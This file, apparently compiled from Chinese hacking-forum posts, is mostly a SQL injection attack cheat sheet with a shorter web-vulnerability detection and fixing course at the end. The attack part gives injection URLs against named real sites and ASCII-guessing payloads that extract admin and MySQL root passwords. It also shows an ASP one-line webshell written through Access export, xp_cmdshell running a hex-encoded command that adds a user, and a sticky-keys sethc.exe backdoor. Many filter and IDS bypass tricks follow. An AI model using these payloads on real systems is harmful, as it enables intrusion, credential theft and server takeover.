@@ -1,0 +1,773 @@
+http://www.worldsroses.com/productview.asp?id=211  and 1=2 union select top 1 1,2,3,4,5,6,7,8,9,0,11,12,13,14,15,16,17,username,19,20,21 from (select top 1 username,password from (select top 2 username,password from admin where 1=1 order by username) t order by username desc)t
+
+执行代码：
+
+ 1.create table cmd (a varchar(50))
+
+ 2.insert into cmd (a) values (‘<%execute request(chr(35))%>’) 
+
+ 3.select * into [a] in ’D:\wwwroot\M3loee.asa;.xls’ ’excel 4.0;’ from cmd;
+
+ 4.drop table cmd;
+
+access导出一句话
+
+
+
+
+判断：
+---------------------------------------------------------------------------
+数据型：  and 1=1      正常                        and 1=2       错误  
+                                                                   
+字符型：  'and  '1='1  正常                       'and '1'='2    错误                         
+          ' and 1=1 and ''='                      ' and 1=2 and ''='                                        
+搜索型： %' and 1=1 and '%'='                    %' and 1=2 and '%'='                             
+         %2525%2527%09and%091=1%23   二次编码，%09代替空格法                                                        
+----------------------------------------------------------------------------
+****************************************************************************
+/ewebeditor.asp?id=1&style=standard
+
+cookies注入语法：
+javascript:alert(document.cookie="id="+escape("123"));
+****************************************************************************
+不知道还记不记得一个漏洞 'or'='or'
+你要是以为这个能进去就错了,这个还是后面被发现的.在发现这个以前一直用的是a'or'a='a
+这个1'or'1'='1.
+本文转自: 黑客武林(www.hack50.com) 详细出处参考：http://www.hack50.com/stu/sort091/sort0103/57479.html
+------------------------------------------------------------------------------------ 
+注入技巧：
+在检测索尼中国的网站漏洞时，分明已经确定了漏洞存在却无法在这三种漏洞中找到对应的类型。
+偶然间我想到了在SQL语言中可以使用“in”关键字进行查询，
+例如“select * from mytable where id in(1)”，括号中的值就是我们提交的数据，它的结果
+与使用“select * from mytable where id=1”的查询结果完全相同。所以访问页面的时候
+在URL后面加上“) and 1=1 and 1 in(1”后原来的SQL语句就
+变成了“select * from mytable where id in(1) and 1=1 and 1 in(1)”，
+这样就会出现期待已久的页面了。暂且就叫这种类型的漏洞为“包含数字型”吧，
+聪明的你一定想到了还有“包含字符型”呢。对了，
+它就是由于类似“select * from mytable where name in('firstsee')”的查询语句造成的
+------------------------------------------------------------------------------------
+
+判断数据库类型：
+
+1: 通过错误信息反馈判断。' and user>o  
+2：通过注释符号判断： -- ； # 及/*
+3: 数据库的特殊性:  
+     mssql: and 1=(select @@VERSION) 或and 1=convert(int,@@version)--
+
+
+猜解表名：
+        and exists (select * from 表名)  或：and (select count(*) from 表名)<>0  正常则有，
+
+猜解列名：
+        and exists (select 列名 from 表名)  或：and (select count(列名) from 表名)<>0
+
+猜解管理员用户个数: and (select count(*) from 表名)>X （X是个数字）
+
+猜解管理员用户名的长度：
+                  and (select len(列名) from 表名)>=X （X是个数字）
+                  and (select top 1 len(列名)from 表名)>N  （N是个数字）
+
+                  因为“top 1”的意思是把最靠前的1条记录给提取出来
+                  如果要猜解第二条记录就该使用：
+                  select top 1 len(列名) from 表名 where 列名 not in (select top 1 列名 from 表名)
+                  第三条：select top 1 len(列名) from 表名 where 列名 not in (select top 2 列名 from 表名)
+
+ASCII码分析法猜解用户和密码:
+                  猜字段的ascii值（access):
+                  and (select top 1 asc(mid(字段名,1,1)) from 表名)>0,1,2,3....
+                  
+                  猜字段的ascii值（mssql):
+                  and (select top 1 unicode(substring(字段名,1,1)) from 表名)>0,1,2,3....
+
+                  and (select top 1 ascii(substring(字段名,m,1)) from 表名)>0,1,2,3...
+
+                  and (select count(*)from 表名 where (asc(mid(列名,1,1))) between 30 and 130)<>0
+               　 and (select asc(mid(列名,1,1)) from 表名)>ascii的值
+
+中文处理法：
+                  and (select top 1 abs(asc(mid(字段,1,1))) from 表名)>ASC码  再有牛族ascii转换工个转换
+
+mysql:中的函数:
+and (select ascii(substr(database(),2,1)))%3C=256 and 1=1 
+and (select char_length(database())  )=2 and 1=1
+爆root密码:
+ /kb/article.php?id=828 and (select ascii(substr(password,1,1)) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)%3E49 and 1=1
+
+暴WEB路径:
+ 可以通过对一个不存在的库进行SELECT操作.Access将会回应一条包含有完整路径的错误信息.: 
+   
+   如：       ' UNION SELECT 1 FROM ThisIsAFakeName.FakeTable 
+*************************************************************************************
+
+
+
+如果遇到order by 错误提示，执行下2次union可解决
+
+    and 1=2 union select 1,2,3,4,5 from 表名 union select 1,2,3,4,5 from 表名
+
+
+having语句，group by 语句
+
+    在Access数据库里，也支持having 和 group by 语句，众所周知，这2个语句我们常用来枚举字段名的，在Mssql数据库中很好使。在acc中就有些别扭了。这里分情况讨论，a:如果站点的Sql查询语句为 select id,name,address from 表名，也就是说查询的是特定的字段数据，那么我们可以这么暴， productshow.asp?id=25 group by 1 having 1=1(数字型)，如果字符型就 ' group by 1 having '1'='1'
+
+    返回的错误：
+
+    Microsoft JET Database Engine (0x80040E21)
+
+    试图执行的查询中不包含作为合计函数一部分的特定表达式 'id' 。
+
+    爆出id字段，继续，productshow.asp?id=25 group by 1,id having 1=1
+
+    返回错误：
+
+    Microsoft JET Database Engine (0x80040E21)
+
+    试图执行的查询中不包含作为合计函数一部分的特定表达式 'email' 。
+
+    依次类推productshow.asp?id=25 group by 1,id,email having 1=1
+
+    b:如果站点的原来SQL查询语句为select * from product where id="&ID&",那么执行上述语句就会返
+
+    回这样的错误：
+
+    Microsoft JET Database Engine 错误 '80040e21'
+
+    不能将已选定 '*' 的字段中组合。
+
+    /productshow.asp，行 18
+
+    这时我们可以这样爆字段，productshow.asp?id=25 having sum(1)=1(数字型),字符型(' having
+
+    sum('1')='1')
+
+    返回的错误：
+
+    Microsoft JET Database Engine 错误 '80040e21'
+
+    试图执行的查询中不包含作为合计函数一部分的特定表达式 'id' 。
+
+    /productshow.asp，行 18
+
+    可以看出爆出了ID
+
+    但这样很有局限性，只能爆出第一个id，其他的没办法了。那只能盲猜了。
+
+    productshow.asp?id=25 and id=1 不报错，productshow.asp?id=25 and name=1 返回错误：
+
+    Microsoft JET Database Engine 错误 '80040e10'
+
+    至少一个参数没有被指定值。
+
+    /productshow.asp，行 18
+
+
+group by 和having后台输入框注入：
+
+在输入框里输入:         ’
+
+在输入框里输入:         ’ having 1=1 and ‘’=’    得到了表名和字段名
+
+再爆其他表名和字段名:
+              输入  :   ’group by 表名.字段名 having 1=1 and ‘’=’    
+                        
+              类推  :   ’group by 表名.字段名,表名.字段名 having 1=1 and ‘’=’
+
+爆字段内容：‘and 1=(select 字段名 from 表名) and ‘’=’ 爆出了用户名
+
+***************************************************
+sql注入全站文章系统采用FSO静态生成的HTML文件来显示:
+***************************************************
+
+大家在是否碰到过这样的站点： 
+全站文章系统采用FSO静态生成的HTML文件来显示。这样做的好处一来可以减轻服务器负担，提高访问速度。二来也阻止了SQL注入式的攻击。。 
+我来说说他们的文章系统原理：全部文章均在数据库存有一个副本。另处根据模板生成一个HTML页面。 
+攻击方法： 
+查看源文件/看里面是否有通过JS来调用的页面。 
+如调用<script language="javascript" src="count.asp?id=1552"></script>来更新文章的浏览次数。 
+我们就可以这样来试一下可否注入： 
+http://服务器域名/count.asp?id=1552’ 
+看一下是否出错。如出错说明有注入漏洞。然后正常攻击。 
+在本机建立一下post.htm的文件和log.txt的文本文件（用来记录用，这是一个好习惯） 
+post.htm内容：主要是方便输入。 
+<iframe name=p src=# width=800 height=350 frameborder=0></iframe> 
+<br> 
+<form action=http://test.com/count.asp target=p> 
+<input name="id" value="1552;update aaa set aaa=(select top 1 name from sysobjects where xtype=’u’ and status>0);--" style="width:750"> 
+<input type=submit value=">>>"> 
+<input type=hidden name=fno value="2, 3"> 
+</form> 
+对于SQLSERVER的服务器可以这样判断：在1552后加一分号，如正常有可能是SQLSERVER 
+对于这类数据库可以先建一个表id=1552;create table aaa(aaa char(20));-- 
+然后插入一条记录：id=1552;insert into aaa values(’test’);-- 
+再之后枚举出他的数据表名： 
+id=1552;update aaa set aaa=(select top 1 name from sysobjects where xtype=’u’ and status>0);-- 
+这是将第一个表名更新到aaa的字段处。 
+id=1552 and exists(select * from aaa where aaa>5)就会报错，多数情况会将表名直接读出：看： 
+Microsoft OLE DB Provider for SQL Server 错误 ’80040e07’ 
+将 varchar 值 ’vote’ 转换为数据类型为 int 的列时发生语法错误。 
+/search.asp，行21 
+其中vote就是表名： 
+也可以先猜出一个表名，再把(select top 1 name from sysobjects where xtype=’u’ and status>0)的值更新到那个表的一条记录中去。通过网页显示。 
+读出第一个表，第二个表可以这样读出来（在条件后加上 and name<>’刚才得到的表名’）。 
+id=1552;update aaa set aaa=(select top 1 name from sysobjects where xtype=’u’ and status>0 and name<>’vote’);-- 
+然后id=1552 and exists(select * from aaa where aaa>5) 
+读出第二个表，^^^^^^一个个的读出，直到没有为止。 
+读字段是这样： 
+id=1552;update aaa set aaa=(select top 1 col_name(object_id(’表名’),1));-- 
+然后id=1552 and exists(select * from aaa where aaa>5)出错，得到字段名 
+id=1552;update aaa set aaa=(select top 1 col_name(object_id(’表名’),2));-- 
+然后id=1552 and exists(select * from aaa where aaa>5)出错，得到字段名 
+……类推 
+==========================================================================
+下面我来介绍一种新方法：注射。注射的语句如下：
+;update shop_admin set password='新MD5加密密码' where password='d4716077c2ba075c'--
+比如，我需要把zhuyaod的密码改成wmmhacker，我们首先要先获得wmmhacker通过MD5加密后的十二
+
+位密码
+这里用明小子的工具就能转换了。wmmhacker - f8dc763194f29433
+;update shop_admin set password='f8dc763194f29433' where password='d4716077c2ba075c'--
+我们来测试。看见了，页面没有返回错误，表示成功了。
+
+本篇文章来源于[0day网络]|[0day Network]|exploit|vulnerability Www.0daynet.Com 原文链接：http://www.0daynet.com/2010/0821/1064.html
+************************
+1433没法执行xp_cmdshell:
+************************
+
+有了sa但无xp_cmdshell ，怎么恢复都提示出错。好象是xxxx.cpp哪里哪里出错。或者找不到指定模块，反正我遇到好多次了。在用exec sp_oacreate 'wscript.shell'也没办法的情况下。。可用此方法
+（很多服务器都把'wscript.shell'给删了。）
+看到既然能用sp_oacreate，sp_oamethod来弄'wscript.shell'或者scripting.filesystemobject
+网上看到的文章都只有几个用法就是'wscript.shell'执行命令或者scripting.filesystemobject来写入木马或读取文件。于是乎应该可以也能复制，删除文件吧。。
+上网找了些资料，得到下面方法：
+复制文件：
+
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out 
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+
+declare @oo int
+exec sp_oacreate 'scripting.filesystemobject', @oo out 
+exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
+
+成功后3389登陆按五次shift键。成功进入服务器。一直向上点"我的电脑"右键"管理" 用户管理直接加用户。
+此法随无技术可言，希望对某些人有点用。
+
+
+****************************************************************************************
+经典绕过注入：
+****************************************************************************************
+路过这个网站,检测了一下.
+http://www.xxx.cn/Article.asp?ID=117 and 1=1
+直接返回主页
+http://www.xxx.cn/Article.asp?ID=117 or 1=1
+直接返回主页
+http://www.xxx.cn/Article.asp?ID=117 or
+没有返回主页 没有过滤or
+http://www.xxx.cn/Article.asp?ID=117 and
+直接返回主页 看来过滤了and
+http://www.xxx.cn/Article.asp?ID=117 or 1
+没有返回主页 即没有过滤or 也没有过滤1
+http://www.xxx.cn/Article.asp?ID=117 or 1=1
+直接返回主页 很明显过滤了等号 
+or的特性是与and相反的.
+or 1=1 爆错 或与原页面不同
+or 1=2 原页面相同
+这样就是一个注入点
+但他过滤了=号 我就用><号代替=号吧!
+or 1<2 很明显是正确的,所以应该与原页面不同
+or 1>2 很明显是错误的,所以应该与原页面相同
+然后看看有没有过滤其他的查询语句,比如select.
+http://www.xxx.cn/Article.asp?ID=117 select
+直接返回主页
+又迷茫了..
+
+
+cookies注入.和以下的方法全都试过了,都失败了.还有什么方法可以饶过吗
+这个系统我以为是my动力,后台却是这样的http://www.xxx.cn/admin.asp(应该不是假够台吧)
+================================================
+以下是转贴:
+
+突然想我们是否可以用什么方法绕过SQL注入的限制呢？到网上考察了一下，提到的方法大多都是针对AND与“’”号和“=”号过滤的突破，虽然有点进步的地方，但还是有一些关键字没有绕过，由于我不常入侵网站所以也不敢对上述过滤的效果进行评论，但是可以肯定的是，效果不会很好…… 
+经过我的收集，大部分的防注入程序都过滤了以下关键字： 
+and | select | update | chr | delete |  from | ; | insert | mid | master. | set | = 
+而这里最难处理的就是select这个关键字了，那么我们怎样来突破他们呢？问题虽未完全解决，但还是说出来与大家分享一下，希望能抛砖引玉。 
+对于关键字的过滤，以下是我收集的以及我个人的一些想法。 
+1、运用编码技术绕过 
+如URLEncode编码，ASCII编码绕过。例如or 1=1即 
+%6f%72 %31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 
+
+2、通过空格绕过 
+如两个空格代替一个空格，用Tab代替空格等，或者删除所有空格，如 
+or’ swords’ =‘swords’ 
+，由于mssql的松散性，我们可以把or ’swords’ 之间的空格去掉，并不影响运行。 
+3、运用字符串判断代替 
+用经典的or 1=1判断绕过,如 
+or ’swords’ =’swords’ 
+，这个方法就是网上在讨论的。 
+4、通过类型转换修饰符N绕过 
+可以说这是一个不错的想法，他除了能在某种程度上绕过限制，而且还有别的作用，大家自己好好想想吧。关于利用，如or ’swords’ = N’ swords’ ，大写的N告诉mssql server 字符串作为nvarchar类型，它起到类型转换的作用，并不影响注射语句本身，但是可以避过基于知识的模式匹配IDS。 
+5、通过+号拆解字符串绕过 
+效果值得考证，但毕竟是一种方法。如 
+or ’swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ’+’ …..’ ) 
+
+6、通过LIKE绕过 
+以前怎么就没想到呢？如or 
+’swords’ LIKE ’sw’ 
+！！！显然可以很轻松的绕过 
+“=”“>” 
+的限制…… 
+7、通过IN绕过 
+与上面的LIKE的思路差不多,如 
+or ’swords’ IN (’swords’) 
+
+8、通过BETWEEN绕过 
+如 
+or ’swords’ BETWEEN ’rw’ AND ’tw’ 
+
+9、通过>或者<绕过 
+or ’swords’ > ’sw’ 
+or ’swords’ < ’tw’ 
+or 1<3 
+…… 
+10、运用注释语句绕过 
+用/**/代替空格，如： 
+UNION /**/ Select /**/user，pwd，from tbluser 
+
+用/**/分割敏感词，如： 
+U/**/ NION /**/ SE/**/ LECT /**/user，pwd from tbluser 
+
+11、用HEX绕过，一般的IDS都无法检测出来 
+0x730079007300610064006D0069006E00 =hex(sysadmin) 
+0x640062005F006F0077006E0065007200 =hex(db_owner) 
+另外，关于通用点的过滤方法，我们可以考虑采用赋值的方法，例如先声明一个变量a，然后把我们的指令赋值给a，然后调用变量a最终执行我们输入的命令。变量a可以是任何命令。如下： 
+　　declare @a sysname 
+　　select @a= 
+　　exec master.dbo.xp_cmdshell @a 
+效果 
+http://www.ilikeplmm.com/show.asp?id=1;declare @a% [email=20sysname select @a=0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400 exec master.dbo.xp_cmdshell @a]20sysname select @a=0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400 exec master.dbo.xp_cmdshell @a[/email];-- 
+
+其中的 
+0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400 
+就是 
+“net user angel pass /add”
+
+一直以来都以为只有空格，tab键和注释符/**/可以用来切割sql关键字，段时间在邪八看了风迅cms注入漏洞那篇帖子，才知道原来回车也可以用来作为分割符（以前竟然没有想到，真是失败）。回车的ascii码是chr(13)&chr(10)，至于为什么要两个连在一起，这个我也不知道。转换成url编码形式是%0d%0a，于是就可以用%0d%0a代替空格pass一些过滤空格的检查了。
+引申一下，只用%0d能正常执行语句吗？只用%0a呢？测试证明，用任意一种分割在mssql、mysql和access里面都是可以的。
+另外，关于mssql的多语句问题。我以前一直以为必须用分号作为语句的结尾，后来发现，完全不是那样。类似
+Copy code
+select * from table exec xp_cmdshell'xxxxxxxxxx'
+
+
+select * from table/**/exec xp_cmdshell'xxxxxxxxxx'
+
+
+select * from table|---tab---|exec xp_cmdshell'xxxxxxxxxx'
+
+
+select * from table|---enter---|exec xp_cmdshell'xxxxxxxxxx'
+
+的语句都是可以正常执行的。而我以前竟然一直不知道！不过这个貌似跟连接数据库驱动有关系，odbc可以正常执行，sqloledb的话就会报错。有兴趣的继续研究吧?
+
+这样，以后遇到带空格过滤关键字的拦截程序，又可以发挥发挥了
+可能大家早就知道了，不管怎么说，发在这里吧！
+
+最近想起可能还有些ascii码可以用来在sql语句中代替空格，于是写个脚本测试了一下，结果在所有128个低位ascii字符中，chr(12)也可以在access里用，不过貌似chr(12)不能出现在and、or之类的关键词附近，原因不清楚。mysql中比access多一个chr(11)可以。至于mssql，挖日，直接从1到32的ascii码换成字符后都可以正常使用。
+
+
+
+对于中间应该出现空格的地方，用()进行替换，不过，对于很复杂的SQL语句就不太好用了。上面说到的是字符型的，如果是数值型，可以在id=1后加一个括号，不过这个我没有测试，
+比如:jmdcw.asp?id=(1)and(select.....)，应该是可行的吧？ 
+
+
+
+************************************************************************************************
+Web编程常见漏洞检测与修补
+2009年05月07日 星期四 
+Web漏洞检测
+白盒检测
+对检测者的要求：
+         ——能读懂用此语言写的程序
+         ——明白漏洞成因
+         ——漏洞挖掘经验
+常用的web脚本语言：Asp/Php/Jsp/asp.net
+
+**************************************************************************************************
+2
+常见的web漏洞
+sql注入
+文件上传
+cookie欺骗
+XSS攻击
+文件包含
+其他
+3
+Sql注入及其危害
+所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通过递交参数构造巧妙的SQL语句，从而成功获取想要的数据。
+分为字符型注入和数字型的注入，由于编程语言不同，所存在的注入类型也不同。
+危害：
+         --非法查询其他数据库资源，如管理员帐号。
+         --执行系统命令
+         --获取服务器root权限
+
+4
+由于使用编程语言和数据库的不同，漏洞的利用以及所造成的危害也不同。
+Sql注入原理
+Test.asp文件代码片段：
+sqlStr = “select * from n_user where username=‘”&username&”’ and password=‘“&password&”’
+rs = conn.execute(sqlStr)
+正常的查询：test.asp?username=test&password=123
+sqlStr = “select * from n_user where username=‘test’ and password=‘123’“
+使password=123 ‘ or ‘1’=‘1：
+Sql语句到数据库后：
+sqlStr = “select * from n_user where username=‘test’ and password=‘123’ or ‘1’=‘1’“
+Or ‘1’=‘1’始终成立。
+5
+可以通过修改city来构造不同的语句来达到我们查询数据库的效果，现在对于sql注入已经全自动化了，最初出现的工具有原54NB论坛小竹写的NBSI，是最经典的工具了，后来出来了无数的全自动注入工具，在这里就不再赘述了。
+Sql二次注入
+Update,Insert插入注入语句，通过内部传参进行注入。
+Insert users （username）values（’1 and 1=1’）
+Select * from users where username =values
+6
+二次注射原理图
+SQL注射
+数据库
+其他函数[如Include]
+构造变量
+UPDATA INSERT
+提取变量
+SELECT
+7
+Asp表现
+存在数字型和字符型注入。
+(A) 数字型   字段=51
+         Select * from 表名 where 字段=51 
+构造参数：ID=49 And [查询条件]
+         生成语句：Select * from 表名 where 字段=49 And [查询条件]
+(B)字符型的另一种形式
+         搜索语句：Select * from 表名 where 字段like ’%关键字%’
+         构造参数：keyword=’ and [查询条件] and ‘%25’=’
+         生成语句：Select * from 表名 where字段like ’%’ and [查询条件] and ‘%’=’%’
+8
+Asp注入的预防
+对于用户端输入的任意字符，包括GET提交，POST提交，Cookie提交，SERVER提交的都需要做严格过滤。
+对于数字型参数判断是否为数字：可用函数isNumeric来判断，返回值为true和false。
+对于字符型参数过滤单引号，将其替换为l两个单引号，使其无法闭合当前sql语句的单引号。
+例外：base64编码
+Sql通用防注入，全局过滤GET、POST
+9
+Asp防注入过滤demo
+Function SafeCheck(strString)
+         If isNumeric(strString) then 
+                   strString=strString
+         Else 
+                   strString=replace(strString,"'","''") 
+         End if 
+                   SafeCheck=strString 
+End function
+10
+Php中的表现
+Php的魔术引号(magic_quotes_gpc ) 。
+php.ini-dist 默认是开启此功能。如果安装php时使用此文件，将不会产生字符型注入，主要是数字型注入。
+数字型注入：
+         select * from guess where id=“.$id.”
+         select * from guess where id=$id
+11
+魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。 ，当打开时，所有的 ‘（单引号），“（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。
+
+GPC不起作用的情况
+
+二次编码
+编码解码引起
+         Urlencode()/Urldecode
+         Rawurlencode()/Rawurldecode
+         Base64_encode()/Base64_decode
+mysql处理GBK编码字符%bf%27导致单引号被绕过的问题。
+其他数据库，如ms sql。对于转义符反斜杠作为字符处理的。
+         select * from test where title ='aaa\' or '1'='1‘
+
+
+
+12
+Php注入的预防(一)
+确认GPC开启，若没开启则用addslashes 函数过滤之
+function myaddslashes($strString){
+         if (is_numeric($strString)){
+                   $strString = $strString;
+         }else{
+                   $strString = addslashes($strString);
+         }
+         return $strString;
+}
+注意mysql的版本以及默认字符集，Mysql>4.1
+字符集连接字符串:
+         mysql_query("SET character_set_connection=$dbcharset,
+         character_set_results=$dbcharset, character_set_client=binary;");
+13
+Php注入的预防(二)
+Php5以上版本Mysqli扩展预防，参数化查询
+$city = "Amersfoort";
+/* create a prepared statement */
+$stmt = $mysqli->prepare("SELECT District FROM City WHERE Name=?")
+            $stmt->bind_param("s", $city);
+    $stmt->execute();
+    $stmt->bind_result($district);
+    $stmt->fetch();
+    printf("%s is in district %s\n", $city, $district);
+    $stmt->close();
+} 
+PHP加入的PDO（PHP Data Object）也有预处理。
+14
+Jsp 表现
+由于java语言是强类型语言，所有变量定义前必须声明其类型，因而仅存在字符型的注入。
+字符型注入实例：
+         String sql = "select * from tb_name where name= '"+varname+"' and passwd='"+varpasswd+"'";
+         stmt = conn.prepareStatement(sql);
+         构造参数varpasswd值为：' or '1' = '1
+Sql语句经过解析后将是：
+         select * from tb_name = '随意' and passwd = '' or '1' = '1';
+15
+由于j2ee项目有很多持久层框架，在这里仅仅用jdbc来讲解。
+Jsp预防
+采用jdbc的prepareStatement查询数据库，并且sql语句中不出现参数，如：
+sqlStr = “select id from info where city=? and open=? order by id desc”;
+stmt = conn.prepareStatement(sqlStr);
+stmt.setString(1,city);
+stmt.setString(2,var1);
+
+16
+Jdbc提供两个方法来执行sql语句：Statement和这个prepareStatement，两者的区别在于： 我们每一个sql语句发送到数据库处理的时候，数据库先进行解析（硬解析）。这个解析是需要消耗cpu时间的。然后把解析的结果保存在数据库的内存中（并 且经过hash算法），以后如果有一样的sql语句，数据库马上就可以找到该语句，根本不需要硬解析过程，而是进行软解析，只是替换？为一些值，
+Asp.net表现
+开发语言常用的有：vb.net和C#,都属于强类型语言，因而只存在字符型注入。
+注入原理，与asp的字符型注入一样。
+
+
+17
+Asp.net注入预防
+使用Ado.net的参数化查询。
+         strSQL = "SELECT * FROM Orders WHERE CustomerID = @CustomerID";
+         SqlCommand cmd = new SqlCommand(strSQL, cn);//创建一个sqlcommand对象。
+         //创建新参数，参数绑定
+         cmd.Parameters.AddWithValue("@CustomerID", "ALFKI");
+18
+与jsp中的jdbc的preparestatement方法原理是一样的，在这里就不再赘述了。
+sql注入的检测简单流程
+Java反编译：
+Jad 1.5.8g
+
+Asp.net反编译：
+.NET Reflector?
+Latest version: 5.1.3
+
+
+Php破解工具：
+deZender 0.9.5.1
+19
+文件上传漏洞
+利用当前系统已有的上传功能，比如文件上传，图像上传等的漏洞来上传任意文件或者webshell。
+危害：直接上传webshell到服务器，甚至获取服务器root权限。
+各种语言表现大同小异。
+20
+Asp上传漏洞表现(一)
+经典的”\0”上传任意后缀文件 。
+假设：filename="c:\nc.exe .bmp"
+
+
+
+
+‘ Check the file extension
+if right(tFile,4) <> “.bmp” then exit sub
+tFile=tFile &".bmp"
+Set FSO = Server.CreateObject("Scripting.FileSystemObject")
+Set FSOFile=
+FSO.CreateTextFile(FSO.BuildPath(Path, tFile))
+
+21
+04年，dvbbs出现的上传漏洞。
+
+04年动力文章系统3.6最先暴出来，之后的oblog。
+
+Asp上传漏洞表现(二)
+         const UpFileType="rar|zip|exe|mpg|rm|wav|mid" 
+         dim EnableUpload        
+         FoundErr=false        '默认FoundErr变量为假EnableUpload=false        '默认EnableUpload变量为假，即不能上...
+for each formName in upload.file
+                   set ofile=upload.file(formName)          ‘生成一个文件对象
+         arrUpFileType=split(UpFileType,“|”)        ’允许上传后缀         名                
+         for i=0 to ubound(arrUpFileType)
+                   if fileEXT=trim(arrUpFileType(i)) then
+                            EnableUpload=true       ’变量改变了！
+                            exit for
+                   end if
+         next
+         if fileEXT="asp" or fileEXT="asa" or fileEXT="aspx" then 
+                       EnableUpload=false
+         end if
+         if EnableUpload=false then
+                   msg=“这种文件类型不允许上传！\n\n只允许上传这几种文件类型：” & UpFileType
+         FoundErr=true                        ‘hoho，FoundErr变量改变了！
+         end if
+22
+Asp上传漏洞表现(二)
+...
+if FoundErr<>true then         
+randomize
+ranNum =int(900*rnd)+100        '生成一个随机数                filename=SavePath& year(now)&month(now)&day(now)&hour(now)&minute(now)&second (now)&ranNum&"."&fileExt        '没有改变上传文件的后缀，爽阿
+        ...
+        ofile.SaveToFile Server.mappath(FileName)   '保存文件
+
+23
+Asp上传漏洞预防/检测
+检查文件名是否包含‘\0’字符。
+采用白名单方式允许上传文件类型。
+检测关键字：Scripting.FileSystemObject/ADODB.Stream
+常见asp上传组件
+FSO等读取文件或目录参数限制
+
+24
+Php上传漏洞表现
+$imageinfo = getimagesize($_FILES['userfile']['tmp_name']);
+if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg') {
+if($_FILES['userfile']['type'] != "image/gif") {   
+        echo “仅允许上传GIF和JPEG图片\n"; exit;
+}
+$uploaddir = 'uploads/';
+$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
+if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
+    echo “文件上传成功.\n";
+} else {
+    echo “上传失败.\n";
+}
+25
+修改数据包的Content-Type: image/gif
+Php上传漏洞预防/检测
+检查上传文件名中是否存在.php字符。
+Apache文件名解析缺陷漏洞,
+         解析.php.cxj
+采用白名单，仅允许安全的类型，如gif/jpg/等，禁止用户自定义文件后缀。
+Windows文件系统对.的忽略：shell.php.=shell.php
+
+检测关键字：move_uploaded_file/is_uploaded_file/copy
+26
+Jsp文件上传漏洞/预防/检测
+后缀检查不严引起的上传任意文件，主要为jsp和war后缀文件。
+采用白名单严格限制上传类型。
+检测方法：
+         ——File/SmartUpload(常用的一个jsp开源上传组件)
+         ——至/WEB-INF/lib/目录下查看相关upload字样的类库，作为关键字搜索。
+27
+Asp.net 文件上传漏洞/预防/检测
+Asp.net自身提供有上传组件，但默认上传任意后缀文件。
+IIS默认解析的后缀名都是不安全的，采用白名单方式上传文件。
+检查关键字：
+         PostedFile.FileName/FileUpload
+28
+Cookie 欺骗攻击
+Cookie：Web服务器存放在客户端计算机的一些信息，主要用来客户端识别或身份识别等。Session,保存在服务器端的。
+Cookie欺骗攻击：攻击者通过修改存放在客户端的cookie来达到欺骗服务器认证目的。
+修改工具：IECookiesView
+         
+29
+Cookie攻击原理
+If(“登录验证过程”){
+         setcookie("isadmin”,1,time()+3600*24*30);
+}//登录成功，写入cookie，一个月后失效，用于下次登录。
+……
+
+$admin= $_COOKIE[“isadmin"];
+         if($admin){
+                   echo “已经登录”;
+         }else{ echo “请重新登陆”;}
+//没对cookie有效性进行验证，导致cookie欺骗产生。
+30
+Cookie欺骗预防
+禁用cookie，采用session。一般适合web系统安全性要求比较高的情况下
+         ——后台管理等。
+增加多参数验证cookie有效性。
+         ——如验证访问者ip是否与上次IP一样等。
+31
+Cookie欺骗检测
+关键字检测
+Asp:
+Response.Cookies/Request.Cookies
+Php:
+Setcookie/$_COOKIE/$HTTP_COOKIE_VARS
+Jsp:
+         response.addCookie /request.getCookies 
+Asp.net:
+          response.Cookies/request.Cookies 
+
+32
+通过搜索关键字，根据关键字所在位置来判断是否存在cookie欺骗的可能性。
+XSS（跨站脚本攻击）
+跨站脚本攻击(通常简写为XSS)是指攻者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。
+危害：
+         ——盗取用户cookie
+         ——Xss蠕虫
+         ——挂马，结合xss蠕虫，危害巨大。
+
+33
+百度空间蠕虫，校内网蠕虫。
+Xss防范
+对用户输入数据编码：
+         Asp:server.htmlencode函数
+         Php:htmlspecialchars函数
+         asp.net:HttpContext.Current.Server.HtmlEncode
+         jsp:默认没有提供过滤方法，需要自写方法。
+过滤危险的html关键字符：
+         比如：script/iframe等。
+34
+获取当前用户cookie的，结合上面介绍的cookie欺骗攻击，可以盗取用户权限。
+XSS检测
+搜索关键字。
+Asp:request/
+Php:$_GET/$_POST/$_COOKIE/$_SERVER
+Jsp：request.getParameter/ request.getCookies
+Asp.net:Request.QueryString/Form/Cookies/SeverVaiables/
+35
+Php 文件包含漏洞
+Php：include/require / include_once /require_once函数使用时参数没有限制导致可以包含远程文件或者本地文件。
+Php4存在远程&本地，php5仅存在本地包含。
+检测： include/require/include_once /require_once
+其他语言表现。
+36
+Php函数引发的漏洞
+Preg_repace()当第一个参数的正则表达式有e符号的时候，第二个参数的字符串当做PHP代码执行。
+         <? 
+         //preg_replace.php
+         echo preg_replace("/test/e",$h,"jutst test"); 
+         
+         preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $h); 
+         ?> 
+Preg_replace.php?h=phpinfo() ,phpinfo()将本执行。
+
+
+37
+Asp.net 爆绝对路径
+
+
+38
+其他漏洞检测
+信息泄露
+权限验证不严
